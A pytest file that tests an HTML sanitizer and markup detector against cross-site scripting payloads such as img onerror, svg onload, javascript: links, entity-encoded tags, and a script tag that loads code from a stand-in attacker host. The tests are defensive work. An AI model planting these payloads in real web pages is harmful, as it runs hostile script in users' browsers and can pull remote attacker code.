import pytest

from services.text_safety import contains_html_markup, strip_html_markup


@pytest.mark.parametrize(
    ("payload", "expected"),
    [
        ("<img/src=x onerror=alert(1)>", ""),
        ("<svg/onload=alert(1)>", ""),
        ("<script src=//attacker.example/xss.js", ""),
        ('<a href="javascript:alert(1)">click me</a>', "click me"),
        ("<!--><script>alert(1)</script>-->", ""),
        ("<script@x.y>alert(1)</script@x.y>", "alert(1)"),
    ],
)
def test_strip_html_markup_never_returns_raw_tag_like_payloads(payload, expected):
    assert strip_html_markup(payload) == expected


@pytest.mark.parametrize(
    "safe_text",
    [
        "Alice <alice@example.com>",
        'AT&T: 2 < 3 and Tom "T"',
        "Compare a < b before saving",
    ],
)
def test_strip_html_markup_preserves_safe_angle_bracket_display_text(safe_text):
    assert strip_html_markup(safe_text) == safe_text


def test_contains_html_markup_allows_plain_alphabetic_comparison_text():
    assert contains_html_markup("Compare a < b before saving") is False


@pytest.mark.parametrize(
    "payload",
    [
        "&lt;img src=x onerror=alert(document.domain)&gt;",
        "<img/src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<math/href=javascript:alert(1)@x>",
        "<script src=//attacker.example/xss.js",
        "&lt;script src=//attacker.example/xss.js",
    ],
)
def test_contains_html_markup_flags_browser_tolerated_active_markup(payload):
    assert contains_html_markup(payload) is True
